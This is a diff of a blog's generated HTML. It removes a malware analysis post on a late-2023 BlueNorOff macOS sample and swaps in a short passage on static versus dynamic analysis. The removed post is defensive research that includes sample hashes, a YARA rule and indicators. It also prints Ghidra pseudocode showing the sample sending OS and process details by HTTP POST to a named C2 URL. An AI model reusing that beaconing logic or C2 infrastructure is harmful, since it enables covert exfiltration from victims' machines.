+<td>An open source tool that allows you to take a snapshot of registry changes in Windows operating systems. A before and after snapshot is taken and the program compares the two, highlighting newly created registry information. There can be a lot of information to sift through, particularly in modern Windows OS where a lot of registry information is dynamically created. Still a very powerful and useful tool for malware analysis.</td>
+</tr>
+</tbody>
+</table>
+<h2 class="relative group">Summary 
     <div id="summary" class="anchor"></div>
     
     <span
@@ -954,510 +1230,9 @@
     </span>        
     
 </h2>
-<p>Today we will be delving into the land of APT malware, focusing on a recent sample from late 2023 of BlueNorOff (also known as APT38 or STARDUST CHOLLIMA). BlueNorOff primarily focuses on financial cybercrime, deploying their bespoke malware to endpoints with a long-term view of exploiting a network for continued access and financial gain. Perhaps the most famous campaign to date from this threat actor was in 2016. The group leveraged the SWIFT network to illegally transfer close to US$1 billion worth of funds from the Federal Reserve Bank of New York belonging to the Bangladesh Bank. Additionally, BlueNorOff have been associated with other famous attacks such as WannaCry, Rawhide, TightVNC and DarkComet.</p>
-<h2 class="relative group">Hash Values 
-    <div id="hash-values" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#hash-values" aria-label="Anchor">#</a>
-    </span>        
-    
-</h2>
-<p>Our sample was collected from VXUnderground and is available <a href="https://vx-underground.org/APTs/2023/2023.11.06%20-%20BlueNoroff%20strikes%20again%20with%20new%20macOS%20malware"   target="_blank">
-    here</a></p>
-<table>
-<thead>
-<tr>
-<th>Hash</th>
-<th>Value</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>MD5</td>
-<td>4cb1802629c041c365e8ddf962cb9ef8</td>
-</tr>
-<tr>
-<td>SHA1</td>
-<td>bc33f1a6c345e0452056ec08d25611b85c350b2e</td>
-</tr>
-<tr>
-<td>SHA256</td>
-<td>c704bd5c5cdc8d65ada8cf8c5c4a0f02e346de84d2a317443ae3eed796673f59</td>
-</tr>
-</tbody>
-</table>
-<h2 class="relative group">Goals of Analysis 
-    <div id="goals-of-analysis" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#goals-of-analysis" aria-label="Anchor">#</a>
-    </span>        
-    
-</h2>
-<p>As always, before we complete our analysis of this sample, we will be establishing some clear goals for the exercise:</p>
-<ul>
-<li>What persistence mechanism, if any, does this malware use?</li>
-<li>Where does this communicate to?</li>
-<li>What are the capabilities of the malware?</li>
-<li>How can we remove/block it?</li>
-<li>Write a YARA rule</li>
-</ul>
-<p>With these goals in mind, we delve into the initial analysis phase.</p>
-<h2 class="relative group">Initial Analysis 
-    <div id="initial-analysis" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#initial-analysis" aria-label="Anchor">#</a>
-    </span>        
-    
-</h2>
-<h3 class="relative group">Looking at VirusTotal 
-    <div id="looking-at-virustotal" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#looking-at-virustotal" aria-label="Anchor">#</a>
-    </span>        
-    
-</h3>
-<p>A great starting point for any analysis can be to leverage open source tooling available. Generally speaking, VirusTotal is a solid way to investigate any given sample. You can get lucky and find some interesting pieces of information that have been identified by the community already, or conversely, be the first person or company to identify a new strain of a malicious object.</p>
-<blockquote>
-<p>Note that you shouldn&rsquo;t depend upon a tool such as VirusTotal to give you all the answers. It&rsquo;s simply a good place to start, if the executable (or other malicious object) has been identified as malicious. It can give you information such as the threat actor that companies have attributed it to, or some idea about the capabilities of the malware (like C2 addresses and API calls).</p>
-</blockquote>
-<p>In the instance of our BlueNorOff sample, it was indeed identified by VirusTotal as malicious. At time of writing this, 35 of 62 vendors identified it as malicious, labelling the threat actor in their signaturing as &ldquo;Lazurus&rdquo; or &ldquo;BlueNorOff&rdquo;. Interestingly, in the figure below, VirusTotal also informs us that our sample has a mach-o header, meaning it was designed to run on MacOS systems.</p>
-<p>
-
-
-
-
-  
-  
-    
-  
-  
-    <figure>
-      
-      <img
-        class="my-0 rounded-md"
-        srcset="
-        /posts/bluenoroff-malware/virustotal_bluenoroff_huf89b413f8a241091e2c7d47777e74876_115671_330x0_resize_box_3.png 330w,
-        /posts/bluenoroff-malware/virustotal_bluenoroff_huf89b413f8a241091e2c7d47777e74876_115671_660x0_resize_box_3.png 660w,
-        /posts/bluenoroff-malware/virustotal_bluenoroff_huf89b413f8a241091e2c7d47777e74876_115671_1024x0_resize_box_3.png 1024w,
-        /posts/bluenoroff-malware/virustotal_bluenoroff_huf89b413f8a241091e2c7d47777e74876_115671_1320x0_resize_box_3.png 2x"
-        src="/posts/bluenoroff-malware/virustotal_bluenoroff_huf89b413f8a241091e2c7d47777e74876_115671_660x0_resize_box_3.png"
-        alt="Virus Total Output"
-      />
-      
-      
-    </figure>
-  
-
-
-<em>Figure 1: VirusTotal results for our sample</em></p>
-<p>There are a bunch of other tabs of information available on VirusTotal which we would use to develop a deeper knowledge and understanding about this executable at this stage, however, that would ruin a lot of the fun of static analysis for us. So for this sample, we will stop here, moving onto strings analysis within Ghidra.</p>
-<h3 class="relative group">Investigating Strings 
-    <div id="investigating-strings" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#investigating-strings" aria-label="Anchor">#</a>
-    </span>        
-    
-</h3>
-<p>After the initial investigation through VirusTotal, the best place to start when analysing any sample is to understand what strings are present in the binary. This can give you some immediate indications of the capabilities of the executable, if you&rsquo;re lucky and it isn&rsquo;t heavily obfuscated. In the case of this sample, I created a new project within Ghidra, and used the <code>Defined Strings</code> module to ascertain any quick wins or a good place to really start static analysis.</p>
-<blockquote>
-<p>It is worth spending some time in Ghidra adjusting your default layout(s). I generally have the following tabs saved as a current layout to ensure that each time I open Ghidra, I don&rsquo;t need to make these adjustments every time, it just remembers my preferences.</p>
-</blockquote>
-<p>
-
-
-
-
-  
-  
-    
-  
-  
-    <figure>
-      
-      <img
-        class="my-0 rounded-md"
-        srcset="
-        /posts/bluenoroff-malware/ghidra_layout_hu157bca2555b647723dd8d4d2c16e6966_602422_330x0_resize_box_3.png 330w,
-        /posts/bluenoroff-malware/ghidra_layout_hu157bca2555b647723dd8d4d2c16e6966_602422_660x0_resize_box_3.png 660w,
-        /posts/bluenoroff-malware/ghidra_layout_hu157bca2555b647723dd8d4d2c16e6966_602422_1024x0_resize_box_3.png 1024w,
-        /posts/bluenoroff-malware/ghidra_layout_hu157bca2555b647723dd8d4d2c16e6966_602422_1320x0_resize_box_3.png 2x"
-        src="/posts/bluenoroff-malware/ghidra_layout_hu157bca2555b647723dd8d4d2c16e6966_602422_660x0_resize_box_3.png"
-        alt="Ghidra Layout"
-      />
-      
-      
-    </figure>
-  
-
-
-<em>Figure 2: Adjusted Ghidra layout</em></p>
-<p>There are some very interesting strings present in this binary, some of which can be seen in the above figure:</p>
-<pre tabindex="0"><code>&#34;Command executed successfully&#34;
-&#34;Failed to execute command: %@\n&#34;
-&#34;http://swissborg[.]b&#34;
-&#34;log/zxcv/bnm&#34;
-&#34;resume&#34;
-&#34;run&#34;
-&#34;Response: %@&#34;
-&#34;sdf:wsx&#34;,&#34;info&#34;,&#34;%@&#34;
-</code></pre><p><strong>Why are these strings interesting?</strong>
-Great question! These strings give us some preliminary information about the potential capabilities of this malware. The presence of a command execution successfully/failed string suggests that this executable can be interacted with my the threat actor in some way. (ie. commands are pushed/sent to the malware to tell it what to do).</p>
-<p>Additionally, a domain name has been baked into this executable. Initial glances at the string suggest that there might be more to this domain name than what is suggested in the defined string output, but this will naturally fall out of our analysis when we complete it.</p>
-<p>The last two string entries are particularly interesting. One could be where the persistence mechanism could be found on disk, or potentially something to do with the domain. The final entry from the list seems to hint at commands that can be issued to the malware - this is based off of the failed to execute string, which has <code>@%</code> defined as the failure.</p>
-<p><strong>Swissborg huh&hellip;</strong>
-Out of complete curiousity, I did a quick search on Google for &ldquo;swissborg&rdquo; to see whether there was any reason for the particular use of this domain name. Interestingly, the results showed that <code>swissborg[.]com</code> is a known cryptocurrency exchange website. It can safely be said then, that the threat actor is attempting to blend their C2 traffic. Likely, hoping that the user or entity that is looking at the domain name inbound/outbound connections, sees them as legitimate, not reading the entire domain name itself.</p>
-<p>Of course, at this point, these are just assumptions based off of a quick cursory glance at the information available to us from strings. With this information in mind, we will delve into deeper static analysis and attempt to work out functions and confirm or disprove our assumptions.</p>
-<h2 class="relative group">Static Analysis 
-    <div id="static-analysis" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#static-analysis" aria-label="Anchor">#</a>
-    </span>        
-    
-</h2>
-<p>The following analysis was performed using Ghidra.</p>
-<h3 class="relative group">Command &amp; Control Infrastructure 
-    <div id="command--control-infrastructure" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#command--control-infrastructure" aria-label="Anchor">#</a>
-    </span>        
-    
-</h3>
-<p>Taking the information that we learned above, I decided to first focus on the domain name that was found.</p>
-<pre tabindex="0"><code>  process_list = (*(code *)PTR__objc_msgSend_100004000)(&amp;_OBJC_CLASS_$_NSProcessInfo,&#34;processInfo&#34;);
-  process_list = _objc_retainAutoreleasedReturnValue(process_list);
-  OS_version = (*(code *)sendmessage)(process_list,&#34;operatingSystemVersionString&#34;);
-  OS_version = _objc_retainAutoreleasedReturnValue(OS_version);
-  domain_name = (*(code *)sendmessage)
-                          (&amp;cf_http://swissborg.b,&#34;stringByAppendingString:&#34;,&amp;cf_log/zxcv/bnm);
-  domain_name = _objc_retainAutoreleasedReturnValue(domain_name);
-</code></pre><p>I started renaming the variables in the Ghidra pseudocode to make it more sensical for the human eye to read. This is my general approach to analysis, fiddling with the variable names as I read through the code until the information makes sense to me. Of course, if deeper analysis reveals that this initial pass was incorrect, I change the variable names to things that are more sensible, given the extra information. For now, we are settling with the above.</p>
-<p>The most interesting piece of information we see within the body of this pseudocode is that there is an append occurring for the domain name. This means that our domain is not simply <code>swissborg[.]b</code> as we initially thought, but the full address is <code>swissborg.blog/zxcv/bnm</code>. Additionally, the contextual information around this body of code tells us that messages are being sent to this address - more and more likely our C2 for this malware. The information the threat actor is interested is in line with general enumeration information, commonly seen across the majority of threat actors:</p>
-<ul>
-<li>Process list - this is significant because it informs the threat actor of anything that is running on the endpoint. Some threat actors are particularly interested in certain applications (like cryptocurrency wallets, to steal information), anti-virus software (it might change their risk appetite) and so on.</li>
-<li>Operating System version - like the above, there might be operation restrictions associated with their malware performing on certain variations of operating systems.</li>
-</ul>
-<p>The next step is to take this domain name and seeing whether it resolves to an IP address. Unfortunately, at the time of writing this article, the domain did not point to any IP address. The significance of performing this action is that, by resolving it, you can complete additional searches on a dataset, such as VirusTotal, to see whether it has been previously used to perform malicious behaviours. This could also have the added benefit of providing more C2 domains to add to our investigation and repository for this threat actor.</p>
-<p>
-
-
-
-
-  
-  
-    
-  
-  
-    <figure>
-      
-      <img
-        class="my-0 rounded-md"
-        srcset="
-        /posts/bluenoroff-malware/domain_name_hueb5bac1be5d64a092fc9887bfd4924f3_31298_330x0_resize_box_3.png 330w,
-        /posts/bluenoroff-malware/domain_name_hueb5bac1be5d64a092fc9887bfd4924f3_31298_660x0_resize_box_3.png 660w,
-        /posts/bluenoroff-malware/domain_name_hueb5bac1be5d64a092fc9887bfd4924f3_31298_1024x0_resize_box_3.png 1024w,
-        /posts/bluenoroff-malware/domain_name_hueb5bac1be5d64a092fc9887bfd4924f3_31298_1320x0_resize_box_3.png 2x"
-        src="/posts/bluenoroff-malware/domain_name_hueb5bac1be5d64a092fc9887bfd4924f3_31298_660x0_resize_box_3.png"
-        alt="Domain name lookup"
-      />
-      
-      
-    </figure>
-  
-
-
-<em>Figure 3: Resolving the domain name using centralops</em></p>
-<p>From this piece of pseudocode alone, we have collected a valuable piece of information - we have our C2 address, and we have some basic functionality of this piece of malware.</p>
-<h3 class="relative group">Comms with C2 
-    <div id="comms-with-c2" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#comms-with-c2" aria-label="Anchor">#</a>
-    </span>        
-    
-</h3>
-<p>Immediately succeeding the above domain information, the pseudocode informs us that the malware will attempt to make a HTTP request to said server, providing some specific information within the URL header as it sends off the message.</p>
-<pre tabindex="0"><code>  URL_request = (*(code *)sendmessage)
-                          (&amp;_OBJC_CLASS_$_NSMutableURLRequest,&#34;requestWithURL:&#34;,url_string);
-  URL_request = _objc_retainAutoreleasedReturnValue(URL_request);
-  (*(code *)sendmessage)(URL_request,&#34;setHTTPMethod:&#34;,&amp;cf_POST);
-  (*(code *)sendmessage)
-            (URL_request,&#34;setValue:forHTTPHeaderField:&#34;,&amp;cf_application/json,&amp;cf_Content-Type);
-  message_format =
-       (*(code *)sendmessage)
-                 (&amp;_OBJC_CLASS_$_NSString,&#34;stringWithFormat:&#34;,&amp;cf_{&#34;sdf&#34;:&#34;wsx&#34;,&#34;info&#34;:&#34;%@&#34;},
-                  OS_version);
-  message_format = _objc_retainAutoreleasedReturnValue(message_format);
-  something_encoding_tmp = (*(code *)sendmessage)(message_format,&#34;dataUsingEncoding:&#34;,4);
-  something_encoding_tmp = _objc_retainAutoreleasedReturnValue(something_encoding_tmp);
-  (*(code *)sendmessage)(URL_request,&#34;setHTTPBody:&#34;,something_encoding_tmp);
-</code></pre><blockquote>
-<p>Note that I initially called one of the variables <code>&quot;something_encoding_tmp&quot;</code> because I was not entirely sure about how it was performing this action, but, I wanted the code to be distinctly more human-readable. This became a temporary variable (and thus why I have <code>_tmp</code> appended on the end of the name, to remind myself to go back and reanalyse this piece of code).</p>
-</blockquote>
-<p>The header will contain:</p>
-<ul>
-<li>POST method</li>
-<li>application/json</li>
-<li>&ldquo;sdf&rdquo;:&ldquo;wsx&rdquo;,&ldquo;info&rdquo;:&quot;%@&quot; where <code>%@</code> is the operating system information that was collected from the endpoint</li>
-</ul>
-<p>It will then be followed by the information it collected from the endpoint: operating system and process listing. Interestingly, analysis does not reveal much information about the first values of this string <code>sdf:wsx</code>. It could be a campaign identifier for the C2 as the malware beacons in operating system information, but without any additional ability to analyse this further through ghidra, it remains an assumption. Irrespective,  this information is then encoded and placed within the body of the HTTP request, sent back to the C2 infrastructure.</p>
-<h2 class="relative group">Understanding flow of execution 
-    <div id="understanding-flow-of-execution" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#understanding-flow-of-execution" aria-label="Anchor">#</a>
-    </span>        
-    
-</h2>
-<p>The next step in our analysis is to understand the flow of execution when this malware runs. We achieve this by analysing the functions of the application.</p>
-<h3 class="relative group">API calls 
-    <div id="api-calls" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#api-calls" aria-label="Anchor">#</a>
-    </span>        
-    
-</h3>
-<p>The following API calls are made within the main body of the malware. These calls enable the malware to perform various actions on the endpoint, inclusive of:</p>
-<ul>
-<li>Determining the operating system number</li>
-<li>Issuing an error message, when the malware&rsquo;s commands fail</li>
-<li>Enabling sending of a message back to the C2 infrastructure</li>
-</ul>
-<p>I have included this list below for future reference. Again, the Apple Developer documentation was my best friend here in understanding the contextual relevance of these calls within the flow of execution.</p>
-<table>
-<thead>
-<tr>
-<th>API</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>NSLog</td>
-<td>Logs an error message to the apple log facility</td>
-</tr>
-<tr>
-<td>NSString</td>
-<td>Encodes a unicode-compliant text string, represented as a sequence of UTF-16 code units</td>
-</tr>
-<tr>
-<td>objc_msgSend</td>
-<td>Sends a message with a simple return value to an instance of a class</td>
-</tr>
-</tbody>
-</table>
-<h2 class="relative group">MITRE ATT&amp;CK Framework 
-    <div id="mitre-attck-framework" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#mitre-attck-framework" aria-label="Anchor">#</a>
-    </span>        
-    
-</h2>
-<table>
-<thead>
-<tr>
-<th>Tactic or Technique</th>
-<th>ID</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Command and Control - Web Protocols</td>
-<td>T1071.001</td>
-<td>The threat actor is leveraging the <code>HTTP POST</code> method to communicate information back to their C2 infrastructure.</td>
-</tr>
-<tr>
-<td>System Information Discovery</td>
-<td>T1082</td>
-<td>This malware pulls operating system information from the endpoint and transmits this information via HTTP POST requests back to C2 infrastructure.</td>
-</tr>
-<tr>
-<td>Process Discovery</td>
-<td>T1057</td>
-<td>The malware gets information about running processes on the infected endpoint, transmitting that information back to C2 infrastructure.</td>
-</tr>
-</tbody>
-</table>
-<h2 class="relative group">Signatures 
-    <div id="signatures" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#signatures" aria-label="Anchor">#</a>
-    </span>        
-    
-</h2>
-<p>The simple structure of this malware has not afforded a comprehensive list of signaturable material for this sample. I have provided the unique identifiers of this malware below, in an effort to make a broad signature to capture instances of this sample running or present on an endpoint. Further exposure to this family of malware and perhaps deeper analysis of the sample would result in a more comprehensive YARA signature to ensure that it is as tight as it can be.</p>
-<h3 class="relative group">Host based Indicators 
-    <div id="host-based-indicators" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#host-based-indicators" aria-label="Anchor">#</a>
-    </span>        
-    
-</h3>
-<p>Below is a condensed list of all the host indicators that were discovered during analysis of this sample.</p>
-<table>
-<thead>
-<tr>
-<th>Indicator</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>&quot;sdf&quot;:&quot;wsx&quot;,&quot;info&quot;:&quot;%@&quot; </code></td>
-<td>Information of relevance to the threat actor that is sent back to C2</td>
-</tr>
-<tr>
-<td><code>Failed to execute command: %@\n</code></td>
-<td>Error message recorded by malware, when a command has not successfully executed</td>
-</tr>
-</tbody>
-</table>
-<h3 class="relative group">Network based Indicators 
-    <div id="network-based-indicators" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#network-based-indicators" aria-label="Anchor">#</a>
-    </span>        
-    
-</h3>
-<p>Below is a condensed list of all the network indicators that were discovered during analysis of this sample.</p>
-<table>
-<thead>
-<tr>
-<th>Indicator</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>http://swissborg[.]blog/zxcv/bnm</code></td>
-<td>Command and control address of threat actor using traffic blending to disguise themselves as a legitimate cryptocurrency website <code>swissborg[.]com</code></td>
-</tr>
-</tbody>
-</table>
-<h3 class="relative group">YARA 
-    <div id="yara" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#yara" aria-label="Anchor">#</a>
-    </span>        
-    
-</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-YAML" data-lang="YAML"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">rule bluenoroff_2023_11_macos_campaign</span>
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span><span style="color:#f92672">meta</span>: 
-</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">created = &#34;2024/05/17&#34;</span>
-</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">modified = &#34;2024/05/17&#34;</span>
-</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">author = &#34;polaryse&#34;</span>
-</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">description = &#34;Simple YARA rule to detect the presence of bluenoroff on macos&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">strings</span>: 
-</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">domain_name = &#34;swissborg.blog/zxcv/bnm&#34;</span>
-</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">error_code = &#34;Failed to execute command: %@\n&#34;</span>
-</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">C2_message = &#34;sdf&#34;:&#34;wsx&#34;,&#34;info&#34;:&#34;%@&#34;</span>
-</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">segmented_domain_1 = &#34;swissborg.b&#34;</span>
-</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">segmented_domain_2 = &#34;log/zxcv/bnm&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">condition</span>:
-</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">any of them</span>
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><h2 class="relative group">Conclusion 
-    <div id="conclusion" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#conclusion" aria-label="Anchor">#</a>
-    </span>        
-    
-</h2>
-<p>This particular sample seems to have limited functionality, providing the process listing and operating system information back to the command and control infrastructure housed at the domain name <code>swissborg[.]blog\zcxv\bnm</code>. From this analysis, it is not clear whether there is any persistence mechanism in place for this executable. The file is dropped on disk and the loop embedded within the program enables continued communications back to C2.</p>
-<p>Returning to our initial goals:
-What persistence mechanism, if any, does this malware use?</p>
-<ul>
-<li>Where does this communicate to? <em>the application persists on disk, though it does not seem to install itself into any known persistence locations on MacOS</em></li>
-<li>What are the capabilities of the malware? <em>this sample has the ability to communicate via web protocols (HTTP POST) back to C2 infrastructure. It delivers information about the operating system of the infected endpoint back to the threat actor</em></li>
-<li>How can we remove/block it? *Creation of a robust YARA rule will result in blocking of this sample.</li>
-<li>Write a YARA rule <em>provided within the scope of this report</em></li>
-</ul>
-<h2 class="relative group">Lessons Learned 
-    <div id="lessons-learned" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#lessons-learned" aria-label="Anchor">#</a>
-    </span>        
-    
-</h2>
-<p>This was a very interesting sample to work through. I found myself rabbit holing a few times due to some level of unfamiliarity with MacOS. That being said, it proved to be quite an interesting research project in discovering function calls that MacOS malware leverages to elicit information from the endpoint. It definitely taught me a lot about how to appropriately search through MacOS documentation to figure out calls and how they work in the operating system.</p>
-<h2 class="relative group">Resources 
-    <div id="resources" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#resources" aria-label="Anchor">#</a>
-    </span>        
-    
-</h2>
-<table>
-<thead>
-<tr>
-<th>Resource</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><a href="https://developer.apple.com/documentation/"   target="_blank">
-    Mac OS Developer Information</a></td>
-<td>I used the developer information to figure out some of the function calls that were made within this malware sample. Always a very good reference and should be open and used whenever analysing a MacOS sample.</td>
-</tr>
-</tbody>
-</table>
+<p>At the end of the day, both static and dynamic analysis make up two critical components of the reverse engineering lifecycle. Both come with their own advantages and disadvantages, which is why it is so critical that they are used in conjunction with one another to perform your analysis. Generally speaking, static analysis is performed before dynamic to ensure that at least a high-level understanding of the executable is established in order to minimise risk when running it dynamically.</p>
+<p>In all instances of reversing a sample, it is critical to maintain a safe operating environment on the platform of your choice, and to employ the scientific process (hypothesis, aims, objectives, analysis and summary) to ensure that you have clear, repeatable objectives and results when performing your analysis.</p>
+<p>As always, remember you are not infallible. Reverse engineering, particularly malware, is all about making and learning from your mistakes as you stumble through analysis and slowly grow in exposure to different coding languages, malware authors and families.  If you find yourself overwhelmed, that is completely fine, just walk away, make yourself a cup of tea/coffee and try again later! You are looking at the same information over and over again with the same set of eyeballs (I hope), so you can and will miss things. Go back to the basics when you are refreshed and try to enjoy getting lost and learning the art of reversing!</p>
 
         </div>
                 
@@ -1471,7 +1246,7 @@ What persistence mechanism, if any, does this malware use?</p>
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://polaryse.github.io/posts/bluenoroff-malware/&amp;title=Delving%20into%20BlueNorOff%20malware"
+      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://polaryse.github.io/topics/understanding_analysis/&amp;title=The%20difference%20between%20Dynamic%20and%20Static%20analysis"
       title="Share on LinkedIn"
       aria-label="Share on LinkedIn"
       >
@@ -1490,7 +1265,7 @@ What persistence mechanism, if any, does this malware use?</p>
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://twitter.com/intent/tweet/?url=https://polaryse.github.io/posts/bluenoroff-malware/&amp;text=Delving%20into%20BlueNorOff%20malware"
+      href="https://twitter.com/intent/tweet/?url=https://polaryse.github.io/topics/understanding_analysis/&amp;text=The%20difference%20between%20Dynamic%20and%20Static%20analysis"
       title="Tweet on Twitter"
       aria-label="Tweet on Twitter"
       >
@@ -1508,7 +1283,7 @@ What persistence mechanism, if any, does this malware use?</p>
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://api.whatsapp.com/send?text=https://polaryse.github.io/posts/bluenoroff-malware/&amp;resubmit=true&amp;title=Delving%20into%20BlueNorOff%20malware"
+      href="https://api.whatsapp.com/send?text=https://polaryse.github.io/topics/understanding_analysis/&amp;resubmit=true&amp;title=The%20difference%20between%20Dynamic%20and%20Static%20analysis"
       title=""
       aria-label=""
       >
@@ -1527,7 +1302,7 @@ What persistence mechanism, if any, does this malware use?</p>
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://pinterest.com/pin/create/bookmarklet/?url=https://polaryse.github.io/posts/bluenoroff-malware/&amp;description=Delving%20into%20BlueNorOff%20malware"
+      href="https://pinterest.com/pin/create/bookmarklet/?url=https://polaryse.github.io/topics/understanding_analysis/&amp;description=The%20difference%20between%20Dynamic%20and%20Static%20analysis"
       title="Pin on Pinterest"
       aria-label="Pin on Pinterest"
       >
@@ -1546,7 +1321,7 @@ What persistence mechanism, if any, does this malware use?</p>
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
